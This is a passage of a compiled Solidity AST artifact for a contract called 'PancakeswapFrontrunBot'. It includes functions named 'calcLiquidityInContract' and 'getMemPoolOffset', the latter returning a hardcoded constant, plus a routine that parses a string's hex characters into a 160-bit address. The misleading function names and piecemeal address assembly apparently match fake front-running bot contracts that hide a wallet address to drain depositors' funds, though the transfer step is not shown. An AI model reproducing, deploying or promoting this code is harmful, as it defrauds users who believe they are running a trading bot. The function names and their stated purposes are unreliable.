																			"nodeType": "ExpressionStatement",
																			"src": "7917:8:3"
																		}
																	]
																}
															},
															"id": 796,
															"nodeType": "IfStatement",
															"src": "7822:354:3",
															"trueBody": {
																"id": 754,
																"nodeType": "Block",
																"src": "7836:43:3",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 752,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 750,
																				"name": "ptr",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 720,
																				"src": "7855:3:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "+=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"hexValue": "31",
																				"id": 751,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "7862:1:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_1_by_1",
																					"typeString": "int_const 1"
																				},
																				"value": "1"
																			},
																			"src": "7855:8:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 753,
																		"nodeType": "ExpressionStatement",
																		"src": "7855:8:3"
																	}
																]
															}
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 739,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 737,
														"name": "ptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 720,
														"src": "7716:3:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 738,
														"name": "end",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 727,
														"src": "7722:3:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7716:9:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 798,
												"initializationExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 735,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 733,
															"name": "l",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 717,
															"src": "7709:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 734,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "7713:1:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "7709:5:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 736,
													"nodeType": "ExpressionStatement",
													"src": "7709:5:3"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 741,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "7727:3:3",
														"subExpression": {
															"argumentTypes": null,
															"id": 740,
															"name": "l",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 717,
															"src": "7727:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 742,
													"nodeType": "ExpressionStatement",
													"src": "7727:3:3"
												},
												"nodeType": "ForStatement",
												"src": "7704:483:3"
											}
										]
									},
									"documentation": null,
									"id": 800,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "calcLiquidityInContract",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 715,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 714,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 800,
												"src": "7570:17:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
													"typeString": "struct PancakeswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 713,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 126,
													"src": "7570:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$126_storage_ptr",
														"typeString": "struct PancakeswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7569:19:3"
									},
									"returnParameters": {
										"id": 718,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 717,
												"mutability": "mutable",
												"name": "l",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 800,
												"src": "7612:6:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 716,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "7612:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7611:8:3"
									},
									"scope": 1724,
									"src": "7537:657:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 807,
										"nodeType": "Block",
										"src": "8260:32:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "333432393839",
													"id": 805,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "8278:6:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_342989_by_1",
														"typeString": "int_const 342989"
													},
													"value": "342989"
												},
												"functionReturnParameters": 804,
												"id": 806,
												"nodeType": "Return",
												"src": "8271:13:3"
											}
										]
									},
									"documentation": null,
									"id": 808,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolOffset",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 801,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "8228:2:3"
									},
									"returnParameters": {
										"id": 804,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 803,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 808,
												"src": "8254:4:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 802,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "8254:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8253:6:3"
									},
									"scope": 1724,
									"src": "8203:89:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 983,
										"nodeType": "Block",
										"src": "8555:857:3",
										"statements": [
											{
												"assignments": [
													816
												],
												"declarations": [
													{
														"constant": false,
														"id": 816,
														"mutability": "mutable",
														"name": "tmp",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 983,
														"src": "8566:16:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 815,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "8566:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 821,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 819,
															"name": "_a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 810,
															"src": "8591:2:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 818,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "8585:5:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 817,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "8585:5:3",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 820,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8585:9:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8566:28:3"
											},
											{
												"assignments": [
													823
												],
												"declarations": [
													{
														"constant": false,
														"id": 823,
														"mutability": "mutable",
														"name": "iaddr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 983,
														"src": "8605:13:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 822,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "8605:7:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 825,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "30",
													"id": 824,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "8621:1:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_0_by_1",
														"typeString": "int_const 0"
													},
													"value": "0"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8605:17:3"
											},
											{
												"assignments": [
													827
												],
												"declarations": [
													{
														"constant": false,
														"id": 827,
														"mutability": "mutable",
														"name": "b1",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 983,
														"src": "8633:10:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 826,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "8633:7:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 828,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "8633:10:3"
											},
											{
												"assignments": [
													830
												],
												"declarations": [
													{
														"constant": false,
														"id": 830,
														"mutability": "mutable",
														"name": "b2",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 983,
														"src": "8654:10:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 829,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "8654:7:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 831,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "8654:10:3"
											},
											{
												"body": {
													"id": 976,
													"nodeType": "Block",
													"src": "8716:657:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 849,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 847,
																	"name": "iaddr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 823,
																	"src": "8731:5:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "*=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "323536",
																	"id": 848,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "8740:3:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_256_by_1",
																		"typeString": "int_const 256"
																	},
																	"value": "256"
																},
																"src": "8731:12:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 850,
															"nodeType": "ExpressionStatement",
															"src": "8731:12:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 861,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 851,
																	"name": "b1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 827,
																	"src": "8758:2:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"baseExpression": {
																						"argumentTypes": null,
																						"id": 856,
																						"name": "tmp",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 816,
																						"src": "8777:3:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					},
																					"id": 858,
																					"indexExpression": {
																						"argumentTypes": null,
																						"id": 857,
																						"name": "i",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 833,
																						"src": "8781:1:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"isConstant": false,
																					"isLValue": true,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "IndexAccess",
																					"src": "8777:6:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 855,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "8771:5:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 854,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "8771:5:3",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 859,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "8771:13:3",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 853,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "8763:7:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint160_$",
																			"typeString": "type(uint160)"
																		},
																		"typeName": {
																			"id": 852,
																			"name": "uint160",
																			"nodeType": "ElementaryTypeName",
																			"src": "8763:7:3",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 860,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "8763:22:3",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "8758:27:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 862,
															"nodeType": "ExpressionStatement",
															"src": "8758:27:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 875,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 863,
																	"name": "b2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 830,
																	"src": "8800:2:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"baseExpression": {
																						"argumentTypes": null,
																						"id": 868,
																						"name": "tmp",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 816,
																						"src": "8819:3:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					},
																					"id": 872,
																					"indexExpression": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 871,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 869,
																							"name": "i",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 833,
																							"src": "8823:1:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "+",
																						"rightExpression": {
																							"argumentTypes": null,
																							"hexValue": "31",
																							"id": 870,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "8827:1:3",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "8823:5:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"isConstant": false,
																					"isLValue": true,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "IndexAccess",
																					"src": "8819:10:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 867,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "8813:5:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 866,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "8813:5:3",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 873,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "8813:17:3",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 865,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "8805:7:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint160_$",
																			"typeString": "type(uint160)"
																		},
																		"typeName": {
																			"id": 864,
																			"name": "uint160",
																			"nodeType": "ElementaryTypeName",
																			"src": "8805:7:3",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 874,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "8805:26:3",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "8800:31:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 876,
															"nodeType": "ExpressionStatement",
															"src": "8800:31:3"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"id": 885,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 879,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 877,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 827,
																				"src": "8851:2:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": ">=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3937",
																				"id": 878,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8857:2:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_97_by_1",
																					"typeString": "int_const 97"
																				},
																				"value": "97"
																			},
																			"src": "8851:8:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 880,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "8850:10:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "&&",
																"rightExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 883,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 881,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 827,
																				"src": "8865:2:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "313032",
																				"id": 882,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8871:3:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_102_by_1",
																					"typeString": "int_const 102"
																				},
																				"value": "102"
																			},
																			"src": "8865:9:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 884,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "8864:11:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"src": "8850:25:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"id": 899,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 893,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 891,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 827,
																					"src": "8931:2:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": ">=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3635",
																					"id": 892,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "8937:2:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_65_by_1",
																						"typeString": "int_const 65"
																					},
																					"value": "65"
																				},
																				"src": "8931:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 894,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "8930:10:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 897,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 895,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 827,
																					"src": "8945:2:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3730",
																					"id": 896,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "8951:2:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_70_by_1",
																						"typeString": "int_const 70"
																					},
																					"value": "70"
																				},
																				"src": "8945:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 898,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "8944:10:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"src": "8930:24:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"id": 913,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 907,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 905,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 827,
																						"src": "9010:2:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
